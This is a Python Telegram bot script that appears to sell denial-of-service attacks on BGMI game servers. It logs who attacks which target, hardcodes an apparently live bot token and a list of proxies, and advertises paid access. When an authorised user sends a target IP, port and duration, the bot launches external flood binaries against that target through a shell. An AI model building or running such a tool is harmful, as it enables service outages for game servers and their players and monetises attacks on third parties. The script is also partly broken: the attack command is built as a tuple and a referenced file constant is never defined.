
# @NOOB_AM GRP#bgmiddoserpython

import telebot
import subprocess
import requests
import datetime
import os

# @NOOB_AM GRPTg #from keep_alive import keep_alive
# @NOOB_AM GRP #keep_alive()
# @NOOB_AM GRP# insert your Telegram bot token here

    
bot = telebot.TeleBot('7921815407:AAFeKl3piQrW8xAml-I50tQ9n_jAphriRCk')

# @NOOB_AM GRP # Admin user IDs
admin_id = ["1257888659"]

# @NOOB_AM GRP # File to store allowed user IDs
USER_FILE = "users.txt"

# @NOOB_AM GRP # File to store command logs
LOG_FILE = "log.txt"


# @NOOB_AM GRP # List of proxy addresses
PROXIES = [
    "https://192.73.244.36:80",
"https://198.49.68.80:80",
"https://148.72.140.24:30127",
"https://209.97.150.167:8080",
"https://159.65.245.255:80",
"https://162.223.94.164:80",#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 

"https://216.137.184.253:80",
"https://35.185.196.38:3128",
"https://172.96.117.205:38001",
"https://50.175.212.77:80",
"https://50.173.182.90:80",
"https://50.172.75.127:80",
"https://50.223.239.167:80",
"https://50.171.122.30:80",
"https://50.223.246.237:80",
"https://50.223.239.175:80",
"https://50.222.245.40:80",
"https://50.223.239.177:80",
"https://50.222.245.41:80",
"https://50.174.7.158:80",
"https://50.168.72.122:80",
"https://50.171.187.50:80",
"https://50.223.239.168:80",
"https://50.223.239.161:80",
"https://50.223.239.160:80",
"https://50.171.187.51:80",
"https://50.169.135.10:80",
"https://50.207.199.86:80",
"https://50.217.226.44:80",
"https://50.172.75.122:80",
"https://50.174.145.9:80",
"https://50.172.75.120:80",
"https://50.221.230.186:80",
"https://50.222.245.47:80",
"https://198.199.86.11:8080",
"https://54.67.125.45:3128",
"https://44.195.247.145:80",
"https://13.59.156.167:3128",
"https://18.223.25.15:80",
"https://3.212.148.199:3128",
"https://3.21.101.158:3128",
"https://52.73.224.54:3128",
"https://44.219.175.186:80",
"https://50.174.7.153:80",
"https://50.168.163.179:80",
"https://50.174.7.154:80",
"https://50.217.226.45:80",
"https://50.221.74.130:80",
"https://50.168.72.118:80",
"https://50.207.199.87:80",
"https://50.217.226.40:80",
"https://50.168.72.115:80",
"https://50.174.7.155:80",
"https://50.217.226.46:80",
"https://50.168.7.250:80",
"https://50.218.204.103:80",
"https://50.145.24.176:80",
"https://50.223.239.173:80",
"https://50.145.24.181:80",
"https://24.205.201.186:80",
"https://13.56.163.250:3128",
"https://47.251.43.115:33333",
"https://198.44.255.5:80",
"https://162.223.94.166:80",
"https://198.199.70.20:31028",
"https://66.191.31.158:80",
"https://13.56.192.187:80",
"https://172.183.241.1:8080",
"https://50.222.245.42:80",
"https://50.168.163.182:80",#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 

"https://50.168.72.119:80",
"https://50.239.72.19:80",
"https://68.185.57.66:80",
"https://50.145.24.186:80",
"https://50.144.161.162:80",
"https://72.169.67.109:87",
"https://50.223.239.190:80",
"https://50.223.239.185:80",
"https://50.168.72.116:80",
"https://50.231.172.74:80",
"https://50.174.145.14:80",
"https://50.222.245.45:80",
"https://50.222.245.46:80",
"https://50.144.161.167:80",
"https://50.223.246.226:80",
"https://50.172.75.124:80",
"https://50.168.163.176:80",
"https://50.174.145.10:80",
"https://50.169.37.50:80",
"https://32.223.6.94:80",
"https://50.172.39.98:80",
"https://50.175.212.79:80",
"https://50.174.145.13:80",
"https://154.208.10.126:80",
"https://50.172.75.123:80",
"https://50.174.7.162:80",
"https://3.12.144.146:3128",#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 

"https://50.239.72.17:80",
"https://50.174.7.156:80",
"https://50.168.163.180:80",
"https://50.231.110.26:80",
"https://50.168.163.178:80",
"https://50.174.7.157:80",#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM

"https://50.217.226.43:80",
"https://50.207.199.82:80",
"https://50.168.72.113:80",
"https://50.207.199.83:80",
"https://50.202.75.26:80",
"https://50.168.163.166:80",
"https://50.175.212.76:80",
"https://34.23.45.223:80",
"https://12.186.205.122:80",#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM

"https://50.230.222.202:80",
"https://50.144.166.226:80",
"https://50.222.245.43:80",
"https://50.222.245.50:80",
"https://50.223.239.194:80",
"https://50.144.168.74:80",
"https://50.171.177.124:80",
"https://50.223.239.191:80",
"https://50.223.38.6:80",
"https://4.155.2.13:9480",
"https://50.174.7.152:80",
"https://50.168.163.177:80",
"https://50.168.72.117:80",
"https://68.178.203.69:8899",
"https://50.239.72.18:80",#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 

"https://50.217.226.47:80",
"https://50.207.199.84:80",
"https://50.174.145.8:80",
"https://50.168.72.114:80",
"https://50.168.163.183:80",
"https://50.207.199.81:80",
"https://50.168.163.181:80",
"https://50.239.72.16:80",
"https://50.223.239.165:80",
"https://50.217.226.42:80",
"https://50.174.7.159:80",
"https://103.170.155.104:3128",
"https://162.240.75.37:80",
"https://137.184.121.54:80",
"https://160.72.98.165:3128",
"https://192.210.236.54:3128",
"https://50.223.239.183:80",
"https://156.239.48.42:3128",
"https://69.58.9.119:7189",
"https://173.214.176.84:6055",
"https://104.165.127.25:3128",
"https://43.245.116.203:6718",
"https://156.239.53.234:3128",
"https://157.52.233.50:5677",
"https://104.165.169.254:3128",
"https://104.165.169.218:3128",
"https://45.41.160.253:6235",
"https://134.73.70.39:6283",
"https://192.186.176.160:8210",
"https://104.207.45.131:3128",
"https://161.123.93.27:5757",
"https://172.245.157.99:6684",
"https://161.123.130.142:5813",
"https://156.239.52.221:3128",
"https://104.207.32.96:3128",
"https://104.165.127.166:3128",
"https://104.165.127.87:3128",
"https://104.207.56.116:3128",
"https://207.244.217.82:6629",
"https://45.141.81.10:6070",
"https://156.239.53.254:3128",
"https://156.239.53.97:3128",
"https://134.73.69.178:6168",
"https://104.207.44.40:3128",
"https://23.228.83.31:5727",
"https://12.163.95.161:8080",
"https://38.170.171.133:5833",
"https://156.239.52.150:3128",
"https://156.239.53.182:3128",
"https://147.124.198.205:6064",
"https://154.16.146.44:80	",
"https://142.111.1.84:5116",
"https://156.239.49.31:3128",
"https://172.245.157.171:6756",
"https://206.206.64.212:6173",
"https://206.206.122.34:5665",
"https://107.179.114.75:5848",
"https://156.239.52.138:3128",
"https://156.239.50.229:3128",
"https://104.207.35.225:3128",
"https://107.173.137.249:6503",
"https://134.73.64.15:6300",
"https://156.239.49.201:3128",
"https://134.73.65.97:6649"
    # @NOOB_AM GRP # Add more proxy addresses as needed
]

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# @NOOB_AM GRP# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # @NOOB_AM GRP # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 

                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

# @NOOB_AM GRP # Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # @NOOB_AM GRP # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# @NOOB_AM GRP # Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = ". No data found ."#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 

            else:
                file.truncate(0)
                response = " successfully ✅"
    except FileNotFoundError:
        response = "No  found."
    return response

# @NOOB_AM GRP # Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 

    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(content_types=['luchi'])
def welcome_start(message):
    response = "Welcome to our chat!"
    try:
        bot.reply_to(message, response)
    except telebot.apihelper.ApiTelegramException as e:
        if e.error_code == 400 and e.description == 'Bad Request: message to be replied not found':
            print(f"Error: Message to be replied not found. Skipping...")
        else:
            raise
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 

@bot.message_handler(commands=['a'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 

        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"𝗛𝗘𝗬 𝗕𝗢𝗧 𝗢𝗪𝗡𝗘𝗥👋\n\n 𝘂𝘀𝗲𝗿 --> {user_to_add} \n𝗔𝗗𝗗𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 ❤️ \n\n𝗡𝗢𝗪 𝗔𝗗𝗗 𝗠𝗢𝗗𝗘"
            else:
                response = "𝗔𝗹𝗿𝗲𝗮𝗱𝘆❌ 𝗲𝘅𝗶𝘀𝘁 𝗮𝗻𝗱 𝘂𝘀𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗯𝗼𝘁"
        else:
            response = "🔻 ＥＲＲＯＲ 🔻"
    else:
        response = "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ"

    bot.reply_to(message, response)


#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 

@bot.message_handler(commands=['r'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝘂𝘀𝗲𝗿 --> {user_to_remove} 𝗥𝗲𝗺𝗼𝘃𝗶𝗻𝗴 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅"
            else:
                response = f"𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐈𝐃 𝐧𝐨𝐭 𝐞𝐱𝐢𝐬𝐭𝐢𝐧𝐠 𝐨𝐧 𝐲𝐨𝐮𝐫 𝐛𝐨𝐭"
        else:
            response = '''𝗘𝗿𝗿𝗼𝗿 :- 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 --> /𝗿 <𝘂𝘀𝗲𝗿_𝗶𝗱>'''
    else:
        response = "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ"

    bot.reply_to(message, response)

#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 

@bot.message_handler(commands=['all'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "ᴺᴼ ᵁˢᴱᴿ ᴰᴬᵀᴬ ᶠᴼᵁᴺᴰ"
        except FileNotFoundError:
            response = "ᴺᴼ ᵁˢᴱᴿ ᴰᴬᵀᴬ ᶠᴼᵁᴺᴰ"
    else:
        response = "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ"
    bot.reply_to(message, response)



@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝗧𝗚 𝗜𝗗 :- {user_id}"
    bot.reply_to(message, response)

# @NOOB_AM GRP # Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"𝆺𝅥⃝Oғͥғɪᴄͣɪͫ͢͢͢ᴀℓ —͟͞͞Ꮅ𝙧ɇ𝙢īū𝙢—͟͞͞\n🔗 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸 🔗\n\n▁ ▂ ▄ ▅ ▆ ▇ █\nA̶t̶t̶a̶c̶k̶ ̶B̶y̶ ̶:̶-̶ {username} \n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══TABISH_VIP═══"
    bot.reply_to(message, response)

# @NOOB_AM GRP # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 

# @NOOB_AM GRP # Handler for /bgmi command
@bot.message_handler(commands=['noob'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # @NOOB_AM GRP # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # @NOOB_AM GRP # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "🦋⁂༄𝙲𝙤𝙤𝕝𝒅𝒐ฬ𝒏༄⁂🦋"
                bot.reply_to(message, response)
                return
            # @NOOB_AM GRP # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # @NOOB_AM GRP # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # @NOOB_AM GRP # Convert time to integer
            time = int(command[3])  # @NOOB_AM GRP # Convert port to integer
            if time > 240:
                response = "𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗮𝗿𝗲 𝗲𝗻𝘁𝗲𝗿𝗲𝗱 𝟮𝟰𝟬 𝘀𝗲𝗰"
            else:
                record_command_logs(user_id, '/noob', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # @HACK_CHIYE GRP # Call start_attack_reply function
                full_command = f"./Rahul {target} {port} {time} 850" , "./RK {target} {port} {time} 850"
                subprocess.run(full_command, shell=True)
                response = f"🏆𝐀🅣𝐓𝐀𝐂𝐊 𝐅𝐈𝐍ｴ𝐒𝐇🏆\n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══TABISH OFFICIAL═══"
        else:
            response = "𝙀𝙉𝙏𝙀𝙍 𝙏𝙃𝙀 𝘼𝙏𝙏𝘼𝘾𝙆\n𝗟𝗜𝗞𝗘 :- /noob 𝟮.𝟯𝟰.𝟱𝟲.𝟱𝟲 𝟮𝟯𝟰𝟱𝟲 𝟮𝟰𝟬\n𝗟𝗜𝗞𝗘 :- /𝗼𝗽 𝘁𝗮𝗿𝗴𝗲𝘁 𝗽𝗼𝗿𝘁 𝘁𝗶𝗺𝗲\n\n═══TABISH OFFIAL═══"  # TABISH OFFICIAL  # Updated command syntax
    else:
        response = "🚫 𝗠𝗲𝘁𝗵𝗼𝗱  𝗹𝗶𝗸𝗲 𝗲𝗮𝘀𝘆 𝗯𝘂𝘁 𝘆𝗼𝘂 𝗮𝗿𝗲 🚫𝗻𝗼𝘁 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝘁𝗵𝗶𝘀 𝘄𝗼𝗿𝗱 𝗜 𝗰𝗮𝗻'𝘁 𝗵𝗲𝗹𝗽 𝘁𝗼 𝘂𝘀𝗲\n𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙖𝙛𝙩𝙚𝙧 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙬𝙤𝙧𝙙 /noob \n𝙘𝙤𝙣𝙩𝙖𝙘𝙩 :- @HACK_CHIYE\n\n═══TABISH VIP═══"

    bot.reply_to(message, response)



# @NOOB_AM GRP # Add /mylogs command to display logs recorded for bgmi and website commands

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🙏 TABISH PAID BOT BY @HACK_CHIYE 🙏'''
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['owner'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''@HACK_CHIYE'''
    bot.reply_to(message, response)

bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 
#script by @NOOB_AM 

























